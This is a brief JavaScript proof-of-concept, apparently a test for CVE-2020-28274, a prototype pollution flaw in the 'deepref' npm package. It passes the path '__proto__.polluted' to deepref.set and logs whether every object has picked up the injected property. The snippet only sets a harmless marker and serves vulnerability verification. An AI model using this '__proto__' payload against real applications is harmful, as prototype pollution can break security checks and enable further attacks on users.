// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
// test("prototype pollution in deepref", () => {
console.log({}.polluted);

  const deepref = require("deepref");
  deepref.set({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
